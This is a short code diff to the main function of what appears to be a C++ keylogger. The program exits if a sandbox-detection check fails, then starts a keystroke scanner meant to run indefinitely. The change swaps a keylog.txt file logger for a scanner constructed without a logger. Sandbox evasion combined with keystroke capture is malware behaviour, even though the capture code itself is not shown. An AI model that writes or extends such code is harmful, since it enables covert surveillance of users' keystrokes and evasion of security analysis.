@@ -11,8 +11,7 @@ int main() {
 		if (!sandboxdetect::checkSafety()) return 0;
 	}
 	//scanning from hereon
-	auto* l = new logFILE("keylog.txt");
-	keyscan scanner(l);
+	keyscan scanner;
 	scanner.scan();
 	//will never be reached
 	return 1;
